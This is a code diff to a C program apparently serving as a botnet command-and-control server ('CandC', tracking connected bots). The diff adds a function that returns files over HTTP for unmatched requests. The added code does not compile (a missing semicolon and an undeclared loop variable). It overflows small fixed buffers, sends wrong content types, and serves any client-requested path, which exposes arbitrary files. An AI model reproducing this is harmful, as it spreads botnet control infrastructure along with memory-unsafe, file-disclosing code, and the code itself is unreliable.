@@ -22,6 +22,25 @@
 #define BACKLOG 10
 #define BOTS_MAX 16
 #define PAYLOAD_MAX 1024
+#define BUFSIZE 8096
+
+
+struct {
+	char *ext;
+	char *filetype;
+} extensions [] = {
+	{"gif", "image/gif" },  
+	{"jpg", "image/jpg" }, 
+	{"jpeg","image/jpeg"},
+	{"png", "image/png" },  
+	{"ico", "image/ico" },  
+	{"zip", "image/zip" },  
+	{"gz",  "image/gz"  },  
+	{"tar", "image/tar" },  
+	{"htm", "text/html" },  
+	{"html","text/html" },  
+	{0,0} };
+
 
 void usage(){
     fprintf(stderr, "Usage: ./CandC [tcp_port]\n");
@@ -370,6 +389,45 @@ void process_stdin(int stdin_fd, int udp_sock, int tcp_sock, struct bot *bots, i
     }
 }
 
+void send_file(int tcp_sock, char *requested_file, int clifd){
+    char buffer[BUFSIZE];
+    int fd, len, ret;
+
+    if((fd = open(requested_file, 0)) == -1){
+        sprintf(buffer, "HTTP/1.1 404 Not Found\n");
+        w_send(clifd, buffer, strlen(buffer), 0);
+        return;
+    }
+
+    char fstr[5];
+    char tmp[5];
+    int j = 0;
+    for(int i = strlen(requested_file) - 1; i >= 0; i--){
+        if(requested_file[i] == '.'){
+            break;
+        }
+        tmp[j] = requested_file[i]
+        j++;
+    } 
+
+    for(i = 0; j >= 0; i++){
+        fstr[i] = tmp[j];
+        j--;
+    }
+
+    len = (long)lseek(fd, (off_t)0, SEEK_END); /* lseek to the file end to find the length */
+	(void)lseek(fd, (off_t)0, SEEK_SET); /* lseek back to the file start ready for reading */
+    (void)sprintf(buffer,"HTTP/1.1 200 OK\nServer: CandC\nContent-Length: %ld\nConnection: close\nContent-Type: %s\n\n", len, fstr);
+
+    w_write(clifd, buffer, strlen(buffer));
+    while (	(ret = read(fd, buffer, BUFSIZE)) > 0 ) {
+		(void)w_write(clifd,buffer,ret);
+	}
+
+    sleep(1);
+    return;
+}
+
 void process_udp(int udp_sock, struct bot *bots, int *number_of_bots){
     char buf[PAYLOAD_MAX];
     memset(buf, 0, PAYLOAD_MAX);
@@ -462,9 +520,8 @@ void process_tcp(int tcp_sock, int udp_sock, struct bot *bots, int number_of_bot
             *quit_flag = true;
         }
         
-
         else{
-            w_send(clifd, method_not_allowed, strlen(method_not_allowed), 0);
+            send_file(tcp_sock, ptr, clifd);
         }
     }
 
